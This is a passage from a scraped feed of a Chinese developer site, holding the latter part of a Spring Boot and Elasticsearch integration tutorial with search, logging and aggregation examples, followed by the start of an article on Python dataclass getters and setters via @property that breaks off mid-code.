<p>使用 <code>@Document</code> 注解定义一个实体类，映射到 Elasticsearch 的索引：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">data</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Id</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">data</span>.<span class="hljs-property">elasticsearch</span>.<span class="hljs-property">annotations</span>.<span class="hljs-property">Document</span>;

<span class="hljs-meta">@Document</span>(indexName = <span class="hljs-string">"articles"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Article</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> id;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> title;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> content;
    
    <span class="hljs-comment">// 无参构造器、有参构造器、getter和setter方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Article</span>() {}
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Article</span>(<span class="hljs-title class_">String</span> id, <span class="hljs-title class_">String</span> title, <span class="hljs-title class_">String</span> content) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span> = title;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span> = content;
    }
    
    <span class="hljs-comment">// Getter 和 Setter 方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getId</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> id; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setId</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> id</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id; }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getTitle</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> title; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setTitle</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> title</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span> = title; }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getContent</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> content; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setContent</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> content</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span> = content; }
}
</code></pre>
<h3 data-id="heading-4">2.3、创建 Elasticsearch Repository</h3>
<p>创建一个继承 <code>ElasticsearchRepository</code> 的接口，用于数据操作：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.elasticsearch.repository.ElasticsearchRepository;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ArticleRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ElasticsearchRepository</span>&lt;Article, String&gt; {
    
    <span class="hljs-comment">// 根据内容进行全文搜索</span>
    List&lt;Article&gt; <span class="hljs-title function_">findByContentContaining</span><span class="hljs-params">(String content)</span>;
    
    <span class="hljs-comment">// 根据标题搜索</span>
    List&lt;Article&gt; <span class="hljs-title function_">findByTitleContaining</span><span class="hljs-params">(String title)</span>;
}
</code></pre>
<h3 data-id="heading-5">2.4、控制器层实现</h3>
<p>创建一个 REST 控制器来处理搜索请求：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.beans</span><span class="hljs-selector-class">.factory</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Autowired</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.bind</span><span class="hljs-selector-class">.annotation</span>.*;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.List</span>;

@<span class="hljs-selector-tag">RestController</span>
@<span class="hljs-selector-tag">RequestMapping</span>(<span class="hljs-string">"/api/articles"</span>)
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">ArticleController</span> {
    
    <span class="hljs-variable">@Autowired</span>
    private ArticleRepository articleRepository;
    
    <span class="hljs-comment">// 搜索文章</span>
    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/search"</span>)
    public List&lt;Article&gt; <span class="hljs-built_in">searchArticles</span>(<span class="hljs-variable">@RequestParam</span> String query) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">articleRepository</span><span class="hljs-selector-class">.findByContentContaining</span>(query);
    }
    
    <span class="hljs-comment">// 添加新文章</span>
    @<span class="hljs-selector-tag">PostMapping</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Article</span> <span class="hljs-selector-tag">createArticle</span>(<span class="hljs-variable">@RequestBody</span> Article article) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">articleRepository</span><span class="hljs-selector-class">.save</span>(article);
    }
}
</code></pre>
<h2 data-id="heading-6">3、Elasticsearch 实战应用案例</h2>
<h3 data-id="heading-7">3.1、案例一：电商平台商品搜索与高亮显示</h3>
<p><strong>业务场景</strong>：电商平台需要为用户提供高效的商品搜索功能，在海量数据中快速返回匹配结果，并高亮显示关键字。</p>
<p><strong>实现步骤</strong>：</p>
<ol>
<li>
<p><strong>创建商品索引</strong>：
使用 Elasticsearch 的 REST API 创建商品索引：</p>
<pre><code class="hljs language-bash" lang="bash">PUT /products
{
  <span class="hljs-string">"mappings"</span>: {
    <span class="hljs-string">"properties"</span>: {
      <span class="hljs-string">"name"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span> },
      <span class="hljs-string">"description"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span> },
      <span class="hljs-string">"price"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"float"</span> }
    }
  }
}
</code></pre>
</li>
<li>
<p><strong>添加商品数据</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">POST /products/_doc/1
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"华为 Mate 70"</span>,
  <span class="hljs-string">"description"</span>: <span class="hljs-string">"Mate 70 手机是搭载纯血鸿蒙NEXT 系统的第一款旗舰机"</span>,
  <span class="hljs-string">"price"</span>: 6500
}
</code></pre>
</li>
<li>
<p><strong>实现搜索与高亮</strong>：
在 Repository 中定义复杂查询方法：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> org.springframework.data.elasticsearch.annotations.Query;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> interface <span class="hljs-type">ProductRepository</span> extends <span class="hljs-type">ElasticsearchRepository</span>&lt;<span class="hljs-type">Product</span>, <span class="hljs-type">String</span>&gt; {
    
    <span class="hljs-meta">@Query</span>(<span class="hljs-string">"{<span class="hljs-subst">\"</span>multi_match<span class="hljs-subst">\"</span>: {<span class="hljs-subst">\"</span>query<span class="hljs-subst">\"</span>: <span class="hljs-subst">\"</span>?0<span class="hljs-subst">\"</span>, <span class="hljs-subst">\"</span>fields<span class="hljs-subst">\"</span>: [<span class="hljs-subst">\"</span>name<span class="hljs-subst">\"</span>, <span class="hljs-subst">\"</span>description<span class="hljs-subst">\"</span>]}}"</span>)
    <span class="hljs-type">List</span>&lt;<span class="hljs-type">Product</span>&gt; findByQuery(<span class="hljs-type">String</span> query);
}
</code></pre>
<p>使用 Elasticsearch 的高亮查询：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">ElasticsearchRestTemplate</span> elasticsearchTemplate;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">SearchHit</span>&lt;<span class="hljs-title class_">Product</span>&gt;&gt; <span class="hljs-title function_">searchProductsWithHighlight</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> keyword</span>) {
        <span class="hljs-comment">// 创建查询条件</span>
        <span class="hljs-title class_">NativeSearchQuery</span> searchQuery = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeSearchQueryBuilder</span>()
            .<span class="hljs-title function_">withQuery</span>(<span class="hljs-title class_">QueryBuilders</span>.<span class="hljs-title function_">multiMatchQuery</span>(keyword, <span class="hljs-string">"name"</span>, <span class="hljs-string">"description"</span>))
            .<span class="hljs-title function_">withHighlightFields</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">HighlightBuilder</span>.<span class="hljs-title class_">Field</span>(<span class="hljs-string">"name"</span>).<span class="hljs-title function_">preTags</span>(<span class="hljs-string">"&lt;em&gt;"</span>).<span class="hljs-title function_">postTags</span>(<span class="hljs-string">"&lt;/em&gt;"</span>),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">HighlightBuilder</span>.<span class="hljs-title class_">Field</span>(<span class="hljs-string">"description"</span>).<span class="hljs-title function_">preTags</span>(<span class="hljs-string">"&lt;em&gt;"</span>).<span class="hljs-title function_">postTags</span>(<span class="hljs-string">"&lt;/em&gt;"</span>)
            )
            .<span class="hljs-title function_">build</span>();
        
        <span class="hljs-title class_">SearchHits</span>&lt;<span class="hljs-title class_">Product</span>&gt; searchHits = elasticsearchTemplate.<span class="hljs-title function_">search</span>(searchQuery, <span class="hljs-title class_">Product</span>.<span class="hljs-property">class</span>);
        <span class="hljs-keyword">return</span> searchHits.<span class="hljs-title function_">getSearchHits</span>();
    }
}
</code></pre>
</li>
</ol>
<h3 data-id="heading-8">3.2、案例二：日志收集与分析系统</h3>
<p><strong>业务场景</strong>：对分布式系统中的应用日志进行集中管理、实时监控与分析，快速定位系统错误和性能瓶颈。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>
<p><strong>使用 ELK/EFK 技术栈</strong>：</p>
<ul>
<li><strong>Filebeat/Logstash</strong>：收集应用日志</li>
<li><strong>Elasticsearch</strong>：存储和索引日志数据</li>
<li><strong>Kibana</strong>：日志可视化和监控</li>
</ul>
</li>
<li>
<p><strong>创建日志索引</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Document</span>(indexName = <span class="hljs-string">"app-logs-#{T(java.time.LocalDate).now().toString()}"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppLog</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> id;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> level;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> message;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> logger;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> timestamp;
    <span class="hljs-comment">// ... 其他字段和方法</span>
}
</code></pre>
</li>
<li>
<p><strong>实现日志分析</strong>：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">public</span> interface <span class="hljs-type">LogRepository</span> extends <span class="hljs-type">ElasticsearchRepository</span>&lt;<span class="hljs-type">AppLog</span>, <span class="hljs-type">String</span>&gt; {
    
    <span class="hljs-comment">// 统计各日志级别的数量</span>
    <span class="hljs-meta">@Query</span>(<span class="hljs-string">"{<span class="hljs-subst">\"</span>aggs<span class="hljs-subst">\"</span>: {<span class="hljs-subst">\"</span>levels<span class="hljs-subst">\"</span>: {<span class="hljs-subst">\"</span>terms<span class="hljs-subst">\"</span>: {<span class="hljs-subst">\"</span>field<span class="hljs-subst">\"</span>: <span class="hljs-subst">\"</span>level.keyword<span class="hljs-subst">\"</span>}}}}"</span>)
    <span class="hljs-type">AggregatedPage</span>&lt;<span class="hljs-type">AppLog</span>&gt; countByLevel();
    
    <span class="hljs-comment">// 根据时间范围查询日志</span>
    <span class="hljs-type">List</span>&lt;<span class="hljs-type">AppLog</span>&gt; findByTimestampBetween(<span class="hljs-type">String</span> startTime, <span class="hljs-type">String</span> endTime);
}
</code></pre>
</li>
</ol>
<h3 data-id="heading-9">3.3、案例三：复杂查询与聚合分析</h3>
<p><strong>业务场景</strong>：新闻分析平台需要对大量文章进行复杂查询和内容分析，例如统计特定关键词的出现频率。</p>
<p><strong>实现方案</strong>：</p>
<ol>
<li>
<p><strong>布尔查询</strong>：
组合多个查询条件：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> org.elasticsearch.index.query.QueryBuilders;
<span class="hljs-keyword">import</span> org.elasticsearch.index.query.BoolQueryBuilder;

<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Article&gt; <span class="hljs-title">complexSearch</span><span class="hljs-params">(<span class="hljs-type">String</span> mustTerm, <span class="hljs-type">String</span> shouldTerm, <span class="hljs-type">String</span> mustNotTerm)</span> </span>{
    BoolQueryBuilder boolQuery = QueryBuilders.<span class="hljs-built_in">boolQuery</span>()
        .<span class="hljs-built_in">must</span>(QueryBuilders.<span class="hljs-built_in">matchQuery</span>(<span class="hljs-string">"title"</span>, mustTerm))
        .<span class="hljs-built_in">should</span>(QueryBuilders.<span class="hljs-built_in">matchQuery</span>(<span class="hljs-string">"content"</span>, shouldTerm))
        .<span class="hljs-built_in">mustNot</span>(QueryBuilders.<span class="hljs-built_in">matchQuery</span>(<span class="hljs-string">"status"</span>, mustNotTerm));
    
    NativeSearchQuery searchQuery = <span class="hljs-keyword">new</span> <span class="hljs-built_in">NativeSearchQueryBuilder</span>()
        .<span class="hljs-built_in">withQuery</span>(boolQuery)
        .<span class="hljs-built_in">build</span>();
    
    <span class="hljs-keyword">return</span> elasticsearchTemplate.<span class="hljs-built_in">search</span>(searchQuery, Article.<span class="hljs-keyword">class</span>).<span class="hljs-built_in">getContent</span>();
}
</code></pre>
</li>
<li>
<p><strong>聚合分析</strong>：
统计标签出现频率：</p>
<pre><code class="hljs language-ini" lang="ini">public void tagAggregation() {
    TermsAggregationBuilder <span class="hljs-attr">aggregation</span> = AggregationBuilders
        .terms("tags_aggregation")
        .field("tags.keyword")<span class="hljs-comment">;</span>
    
    NativeSearchQuery <span class="hljs-attr">searchQuery</span> = new NativeSearchQueryBuilder()
        .addAggregation(aggregation)
        .build()<span class="hljs-comment">;</span>
    
    SearchHits&lt;Article&gt; <span class="hljs-attr">searchHits</span> = elasticsearchTemplate.search(searchQuery, Article.class)<span class="hljs-comment">;</span>
    Terms <span class="hljs-attr">terms</span> = searchHits.getAggregations().get(<span class="hljs-string">"tags_aggregation"</span>)<span class="hljs-comment">;</span>
    
    for (Terms.Bucket bucket : terms.getBuckets()) {
        System.out.println("标签: " + bucket.getKey() + ", 数量: " + bucket.getDocCount())<span class="hljs-comment">;</span>
    }
}
</code></pre>
</li>
</ol>
<h2 data-id="heading-10">4、性能优化建议</h2>
<ol>
<li>
<p><strong>索引优化</strong>：</p>
<ul>
<li>为常用字段建立合适的索引映射</li>
<li>根据数据类型选择合适的分析器</li>
</ul>
</li>
<li>
<p><strong>查询优化</strong>：</p>
<ul>
<li>使用过滤器缓存结果</li>
<li>限制检索范围，避免全索引扫描</li>
<li>使用分页减少返回数据量</li>
</ul>
</li>
<li>
<p><strong>集群与分片配置</strong>：</p>
<ul>
<li>根据数据量和硬件配置合理设置分片数量和副本</li>
<li>监控节点负载，避免热点数据问题</li>
</ul>
</li>
<li>
<p><strong>批量操作</strong>：
对于大量数据插入和更新，使用批量操作提高效率：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class BulkOperationService {
    
    <span class="hljs-keyword">@Autowired</span>
    private ElasticsearchRestTemplate elasticsearchTemplate;
    
    public void <span class="hljs-built_in">bulkInsert</span>(List&lt;Article&gt; articles) {
        List&lt;IndexQuery&gt; queries = articles<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.map</span>(article -&gt; new IndexQueryBuilder()
                <span class="hljs-selector-class">.withId</span>(article.getId())
                <span class="hljs-selector-class">.withObject</span>(article)
                <span class="hljs-selector-class">.build</span>())
            <span class="hljs-selector-class">.collect</span>(Collectors.toList());
        
        elasticsearchTemplate<span class="hljs-selector-class">.bulkIndex</span>(queries, BulkOptions.defaultOptions());
    }
}
</code></pre>
</li>
</ol>
<h2 data-id="heading-11">5、总结</h2>
<p>主要介绍了 Spring Boot 与 Elasticsearch 的整合方法，并通过电商搜索、日志分析和复杂查询三个实际案例展示了 Elasticsearch 的应用价值。通过合理的配置和优化，Elasticsearch 能够为应用程序提供强大的搜索和数据分析能力，满足大数据量下的高性能需求。</p>
<p>Elasticsearch 的分布式特性和丰富的功能集使其成为现代应用中不可或缺的搜索和分析引擎，合理利用其特性可以显著提升应用的搜索体验和数据处理能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2dbbcbf45674c1b9e09659e67e261bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764553572&amp;x-signature=jOsMMYx2SXY8DEubf45xxUyOcms%3D" alt="image.png" loading="lazy"/></p>
<p><strong>谢谢你看我的文章，既然看到这里了，如果觉得不错，随手点个赞、转发、在看三连吧，感谢感谢。那我们，下次再见。</strong></p>
<p>您的一键三连，是我更新的最大动力，谢谢</p>
<p>山水有相逢，来日皆可期，谢谢阅读，我们再会</p>
<p>我手中的金箍棒，上能通天，下能探海</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python 高级特性dataclass]]></title>    <link>https://juejin.cn/post/7575456858428080174</link>    <guid>https://juejin.cn/post/7575456858428080174</guid>    <pubDate>2025-11-24T02:08:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575456858428080174" data-draft-id="7575469988737302537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python 高级特性dataclass"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-24T02:08:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GeekPMAlex"/> <meta itemprop="url" content="https://juejin.cn/user/2326992765334446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python 高级特性dataclass
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2326992765334446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GeekPMAlex
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:08:08.000Z" title="Mon Nov 24 2025 02:08:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Python Dataclass 中的 Getter 与 Setter：你需要知道的一切</h2>
<p>在 Python 编程中，<code>dataclass</code> 是一个非常实用的装饰器，它能自动为我们生成常见的“样板代码”（boilerplate code），比如 <code>__init__</code>、<code>__repr__</code>、<code>__eq__</code> 等方法。然而，很多刚接触 <code>dataclass</code> 的开发者会问一个问题：</p>
<blockquote>
<p><strong>“dataclass 会自动生成 getter 和 setter 吗？”</strong></p>
</blockquote>
<p>答案是：<strong>不会</strong>。</p>
<p>但别担心！Python 的设计哲学本身就鼓励直接访问属性，而不是像 Java 那样强制封装。不过，当你确实需要对属性的读写进行控制时（比如数据校验、格式转换、日志记录等），我们可以通过 <code>@property</code> 装饰器来实现类似传统 getter/setter 的功能。</p>
<p>本文将带你深入理解 dataclass 中属性访问的机制，并通过实际代码示例展示如何优雅地实现自定义 getter 和 setter。</p>
<hr/>
<h3 data-id="heading-1">1. 默认行为：直接访问属性</h3>
<p>首先，让我们看看最简单的 dataclass 是怎么工作的：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    name: <span class="hljs-built_in">str</span>
    age: <span class="hljs-built_in">int</span>

<span class="hljs-comment"># 创建实例</span>
p = Person(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">30</span>)

<span class="hljs-comment"># 直接读取（相当于 getter）</span>
<span class="hljs-built_in">print</span>(p.name)  <span class="hljs-comment"># 输出: Alice</span>

<span class="hljs-comment"># 直接赋值（相当于 setter）</span>
p.age = <span class="hljs-number">31</span>
<span class="hljs-built_in">print</span>(p.age)   <span class="hljs-comment"># 输出: 31</span>
</code></pre>
<p>在 Python 中，<strong>直接访问属性是惯用做法</strong>。这不仅简洁，而且性能更好。PEP 8 和 Python 社区普遍认为，除非有特殊需求，否则不需要为每个字段都写 getter/setter 方法。</p>
<hr/>
<h3 data-id="heading-2">2. 何时需要自定义 getter/setter？</h3>
<p>虽然直接访问是推荐方式，但在以下场景中，你可能需要控制属性的读写行为：</p>
<ul>
<li>对输入值进行验证（如年龄不能为负数）</li>
<li>自动格式化数据（如姓名转大写）</li>
<li>实现只读属性</li>
<li>触发副作用（如记录日志、更新缓存）</li>
</ul>
<p>这时，<code>@property</code> 就派上用场了。</p>
<hr/>
<h3 data-id="heading-3">3. 使用 <code>@property</code> 实现自定义 getter/setter</h3>
<p>我们可以通过将字段设为“私有”（约定以 <code>_</code> 开头），然后用 <code>@property</code> 提供受控的公共接口。</p>
<h4 data-id="heading-4">示例：带验证和格式化的 Person 类</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    _name: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># 私有字段，不直接暴露给用户</span>
    _age: <span class="hljs-built_in">int</span>

<span class="hljs-meta">    @property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""Getter：返回大写格式的姓名"""</span>
        <span class="hljs-keyword">return</span> self._name.upper()

<span class="hljs-meta">    @name.setter</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self, value: <span class="hljs-built_in">str</span></span>):
        <span class="hljs-string">"""Setter：确保姓名非空"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value.strip():
            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"姓名不能为空"</span>)
        self._name = value.strip()

<span class="hljs-meta">    @property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:
        <span class="hljs-string">"""Getter：直接返回年龄"""</span>
        <span class="hljs-keyword">return</span> self._age

<span class="hljs-meta">    @age.setter</span>
